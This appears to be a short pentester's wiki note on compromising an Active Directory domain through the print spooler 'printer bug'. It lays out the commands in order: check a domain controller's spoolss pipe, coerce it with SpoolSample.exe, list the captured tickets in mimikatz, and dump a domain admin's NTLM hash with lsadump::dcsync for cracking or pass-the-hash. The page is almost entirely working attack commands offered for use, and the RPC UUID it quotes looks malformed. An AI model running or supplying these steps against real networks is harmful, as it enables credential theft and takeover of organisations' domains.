<!-- TITLE: Spoolsample -->
<!-- SUBTITLE: A quick summary of Spoolsample -->

Instructions from https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation
# First check is spoolss is running
## Method one from inside powershell on compromised box
ls \\dc01\pipe\spoolss

should result in a line showing a name of spoolss

## Method two
"You can use impacket's rpcdump.py to check if this UUID exists "12345678-1234-ABCD-EF00123456789AB".  No command execution is required.


# Now run spool Sample
From https://github.com/leechristensen/SpoolSample
A version is on anon in /security
dc01 is target. ws01 is the box that dc01 will rpc auth at.

```
.\SpoolSample.exe dc01 ws01
```
# Use mimikatz to view tickets in memory and use it.
```
mimikatz # sekurlsa::tickets
```
Hopefully it shows a TicketGrantingTicket

Now ask for the hash for the user spotless (ideally a domain admin)
```
mimikatz # lsadump::dcsync /domain:offense.local /user:spotless
```

Should show up in Hash NTLM line ready for cracking or passing. 

